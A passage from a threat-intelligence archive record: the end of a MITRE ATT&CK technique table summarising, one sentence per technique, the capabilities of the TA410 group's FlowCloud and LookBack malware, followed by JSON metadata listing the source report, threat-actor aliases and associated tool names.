Token\n\n[T1070.004](https://attack.mitre.org/versions/v9/techniques/T1070/004) Indicator Removal on\nHost: File Deletion\n\n[T1070.006](https://attack.mitre.org/versions/v9/techniques/T1070.006/) Indicator Removal on\nHost: Timestomp\n\n\nOne of FlowCloud’s DLLs replaces instructions in the loading\nprocess to make it execute code written in its memory.\n\nFlowCloud uses module stomping to hide the loading of its\nmain backdoor.\n\nMultiple TA410 backdoors communicate with their C&C\nthrough encrypted and obfuscated channels.\n\nFlowCloud uses DLL Side-Loading to launch its second-stage\ndropper.\n\nSome versions of FlowCloud use the Pafish utility to detect\nvirtualization, sandboxes, and debuggers.\n\nFlowCloud can create processes using tokens acquired from\nlegitimate processes.\n\nFlowCloud deletes its rootkit’s executable after launching it.\n\nFlowCloud backdates some files and services to 2013.\n\n\nDiscovery [T1010](https://attack.mitre.org/versions/v9/techniques/T1010/) Application Window Discovery When logging mouse events,\nFlowCloud gathers information\nabout the application running in\nthe foreground.\n\n[T1057](https://attack.mitre.org/versions/v9/techniques/T1057/) Process Discovery Multiple TA410 backdoors can list running processes.\n\n[T1518](https://attack.mitre.org/versions/v9/techniques/T1518) Software Discovery FlowCloud uses the IShellAppManager COM object to list\ninstalled software.\n\n\n[T1083](https://attack.mitre.org/versions/v9/techniques/T1083/) File and Directory\nDiscovery\n\n[T1120](https://attack.mitre.org/versions/v9/techniques/T1120/) Peripheral Device\nDiscovery\n\n\nFlowCloud can search through connected file systems and\nobtain directory listings.\n\nFlowCloud can list connected camera devices.\n\n\n-----\n\n**Tactic** **ID** **Name** **Description**\n\n\n[T1016](https://attack.mitre.org/versions/v9/techniques/T1016/) System Network\nConfiguration\nDiscovery\n\n\nFlowCloud can discover and use locally configured proxies.\n\n\n[T1012](https://attack.mitre.org/versions/v9/techniques/T1012/) Query Registry FlowCloud components use registry keys to signal each\nother.\n\n[T1115](https://attack.mitre.org/versions/v9/techniques/T1115/) Clipboard Data FlowCloud registers a listener to steal clipboard data when it\nis changed.\n\nCollection [T1056](https://attack.mitre.org/versions/v9/techniques/T1056) Input Capture FlowCloud logs mouse clicks.\n\n\n[T1056.001](https://attack.mitre.org/versions/v9/techniques/T1056/001) Input Capture:\nKeylogging\n\n\nFlowCloud records keystrokes.\n\n\n[T1113](https://attack.mitre.org/versions/v9/techniques/T1113) Screen Capture FlowCloud takes screenshots at regular intervals.\n\n[T1125](https://attack.mitre.org/versions/v9/techniques/T1125) Video Capture FlowCloud uses OpenCV to take pictures using connected\ncamera devices.\n\n[T1123](https://attack.mitre.org/versions/v9/techniques/T1123) Audio Capture FlowCloud has audio capture functionality.\n\n[T1119](https://attack.mitre.org/versions/v9/techniques/T1119/) Automated Collection FlowCloud automatically collects data based on timers and\nevents.\n\n\n[T1074.001](https://attack.mitre.org/versions/v9/techniques/T1074/001/) Data Staged: Local\nData Staging\n\n[T1005](https://attack.mitre.org/versions/v9/techniques/T1005/) Data from Local\nSystem\n\n[T1025](https://attack.mitre.org/versions/v9/techniques/T1025/) Data from Removable\nMedia\n\n[T1560.002](https://attack.mitre.org/versions/v9/techniques/T1560/002/) Archive Collected\nData: Archive via\nLibrary\n\n[T1560.003](https://attack.mitre.org/versions/v9/techniques/T1560/003/) Archive Collected\nData: Archive via\nCustom Method\n\n\nFlowCloud stores collected data in local SQLite databases\nprior to exfiltration.\n\nFlowCloud can exfiltrate files from local file systems.\n\nFlowCloud can exfiltrate files from removable drives.\n\nFlowCloud and LookBack use a statically linked zlib library to\ncompress data.\n\nFlowCloud compresses some collected data by removing\nduplicates and similar screen captures.\n\n\nCommand\nAnd Control\n\n\n[T1071.001](https://attack.mitre.org/versions/v9/techniques/T1071/001/) Application Layer Protocol: Web Protocols LookBack and FlowCloud can\nsend and receive data over HTTP.\n\n\n[T1095](https://attack.mitre.org/versions/v9/techniques/T1095/) Non-Application Layer\nProtocol\n\n[T1132.001](https://attack.mitre.org/versions/v9/techniques/T1132/001) Data Encoding:\nStandard Encoding\n\n[T1132.002](https://attack.mitre.org/versions/v9/techniques/T1132/002) Data Encoding: NonStandard Encoding\n\n[T1573.001](https://attack.mitre.org/versions/v9/techniques/T1573/001/) Encrypted Channel:\nSymmetric\nCryptography\n\n\nLookBack can communicate over raw TCP sockets.\n\nFlowCloud uses Protobuf to encode C&C commands and\nconfiguration.\n\nLookBack encodes binary data using a custom hex-encoding\nmethod.\n\nFlowCloud can use XOR, TEA, RC4 and a modified AES\nalgorithm to encrypt traffic and files.\n\n\nExfiltration [T1030](https://attack.mitre.org/versions/v9/techniques/T1030/) Data Transfer Size Limits FlowCloud uses local caches to\nstage data and exfiltrates their\ncontent when it reaches a size\nspecified in its configuration.\n\nImpact [T1529](https://attack.mitre.org/versions/v9/techniques/T1529/) System Shutdown/Reboot FlowCloud can force a system\ncrash or shutdown.\n\n\n-----\n\n27 Apr 2022 - 03:00PM\n\n### Sign up to receive an email update whenever a new article is published in our Ukraine Crisis – Digital Security Resource Center\n\n Newsletter\n\n Discussion\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-04-27 - A lookback under the TA410 umbrella- Its cyberespionage TTPs and activity.pdf"
    ],
    "report_names": [
        "2022-04-27 - A lookback under the TA410 umbrella- Its cyberespionage TTPs and activity.pdf"
    ],
    "threat_actors": [
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "faa4a29b-254a-45bd-b412-9a1cbddbd5e3",
            "created_at": "2022-10-25T16:07:23.80111Z",
            "updated_at": "2025-03-27T02:02:09.985067Z",
            "deleted_at": null,
            "main_name": "LookBack",
            "aliases": [
                "FlowingFrog",
                "LookBack",
                "LookingFrog",
                "TA410",
                "Witchetty"
            ],
            "source_name": "ETDA:LookBack",
            "tools": [
                "FlowCloud",
                "GUP Proxy Tool",
                "SodomMain",
                "SodomMain RAT",
                "SodomNormal"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "9ffcbb0c-7a0f-419f-a174-f18a02ce47f1",
            "created_at": "2023-01-06T13:46:39.059774Z",
            "updated_at": "2025-03-27T02:00:02.98747Z",
            "deleted_at": null,
            "main_name": "TA410",
            "aliases": [],
            "source_name": "MISPGALAXY:TA410",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "3e8f802c-efba-45ff-8844-5ea4e4a5297d",
            "created_at": "2023-11-07T02:00:07.092751Z",
            "updated_at": "2025-03-27T02:00:03.170625Z",
            "deleted_at": null,
            "main_name": "Witchetty",
            "aliases": [
                "LookingFrog"
            ],
            "source_name": "MISPGALAXY:Witchetty",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ec14074c-8517-40e1-b4d7-3897f1254487",
            "created_at": "2023-01-06T13:46:38.300905Z",
            "updated_at": "2025-03-27T02:00:02.799108Z",
            "deleted_at": null,
            "main_name": "APT10",
            "aliases": [
                "TA429",
                "STONE PANDA",
                "POTASSIUM",
                "Red Apollo",
                "HOGFISH",
                "Cloud Hopper",
                "BRONZE RIVERSIDE",
                "ATK41",
                "G0045",
                "Menupass Team",
                "happyyongzi",
                "CVNX",
                "Granite Taurus"
            ],
            "source_name": "MISPGALAXY:APT10",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "08623296-52be-4977-8622-50efda44e9cc",
            "created_at": "2023-01-06T13:46:38.549387Z",
            "updated_at": "2025-03-27T02:00:02.859535Z",
            "deleted_at": null,
            "main_name": "Equation Group",
            "aliases": [
                "Tilded Team",
                "EQGRP",
                "G0020"
            ],
            "source_name": "MISPGALAXY:Equation Group",
            "tools": [
                "EquationLaser",
                "EquationDrug",
                "DoubleFantasy",
                "TripleFantasy",
                "GrayFish"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ba3fff0c-3ba0-4855-9eeb-1af9ee18136a",
            "created_at": "2022-10-25T15:50:23.298889Z",
            "updated_at": "2025-03-27T02:00:55.433541Z",
            "deleted_at": null,
            "main_name": "menuPass",
            "aliases": [
                "menuPass",
                "POTASSIUM",
                "Stone Panda",
                "APT10",
                "Red Apollo",
                "CVNX",
                "HOGFISH",
                "BRONZE RIVERSIDE"
            ],
            "source_name": "MITRE:menuPass",
            "tools": [
                "certutil",
                "FYAnti",
                "UPPERCUT",
                "SNUGRIDE",
                "P8RAT",
                "RedLeaves",
                "SodaMaster",
                "pwdump",
                "Mimikatz",
                "PlugX",
                "PowerSploit",
                "ChChes",
                "cmd",
                "QuasarRAT",
                "AdFind",
                "Cobalt Strike",
                "PoisonIvy",
                "EvilGrab",
                "esentutl",
                "Impacket",
                "Ecipekac",
                "PsExec",
                "HUI Loader"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "2d9fbbd7-e4c3-40e5-b751-27af27c8610b",
            "created_at": "2024-05-01T02:03:08.144214Z",
            "updated_at": "2025-03-27T02:05:17.419705Z",
            "deleted_at": null,
            "main_name": "PLATINUM COLONY",
            "aliases": [
                "Equation Group "
            ],
            "source_name": "Secureworks:PLATINUM COLONY",
            "tools": [
                " EquationDrug",
                " EquationLaser",
                " Fanny",
                " GrayFish",
                " TripleFantasy",
                "DoubleFantasy"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "ba9fa308-a29a-4928-9c06-73aafec7624c",
            "created_at": "2024-05-01T02:03:07.981061Z",
            "updated_at": "2025-03-27T02:05:17.28602Z",
            "deleted_at": null,
            "main_name": "BRONZE RIVERSIDE",
            "aliases": [
                "CTG-5938 ",
                "CVNX ",
                "Hogfish ",
                "MenuPass ",
                "POTASSIUM ",
                "Red Apollo ",
                "Stone Panda ",
                "APT10 "
            ],
            "source_name": "Secureworks:BRONZE RIVERSIDE",
            "tools": [
                " ChChes",
                " Cobalt Strike",
                " PlugX",
                " PoisonIvy",
                " QuasarRAT",
                " QuasarRAT Loader",
                " RedLeaves",
                "ANEL"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "e0fed6e6-a593-4041-80ef-694261825937",
            "created_at": "2022-10-25T16:07:23.593572Z",
            "updated_at": "2025-03-27T02:02:09.879892Z",
            "deleted_at": null,
            "main_name": "Equation Group",
            "aliases": [
                "APT-C-40",
                "Platinum Colony",
                "Tilded Team"
            ],
            "source_name": "ETDA:Equation Group",
            "tools": [
                "Bvp47",
                "DEMENTIAWHEEL",
                "DOUBLEFANTASY",
                "DanderSpritz",
                "DarkPulsar",
                "DoubleFantasy",
                "DoubleFeature",
                "DoublePulsar",
                "Duqu",
                "EQUATIONDRUG",
                "EQUATIONLASER",
                "EQUESTRE",
                "Flamer",
                "GRAYFISH",
                "GROK",
                "OddJob",
                "Plexor",
                "Prax",
                "Regin",
                "Skywiper",
                "TRIPLEFANTASY",
                "Tilded",
                "UNITEDRAKE",
                "WarriorPride",
                "sKyWIper"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536230,
    "ts_updated_at": 1743041746,
    "ts_creation_date": 1653698246,
    "ts_modification_date": 1653698246,
    "files": {
        "pdf": "https://archive.orkl.eu/95f13119065e0b0149edc755bd16f278c3a2a542.pdf",
        "text": "https://archive.orkl.eu/95f13119065e0b0149edc755bd16f278c3a2a542.txt",
        "img": "https://archive.orkl.eu/95f13119065e0b0149edc755bd16f278c3a2a542.jpg"
    }
}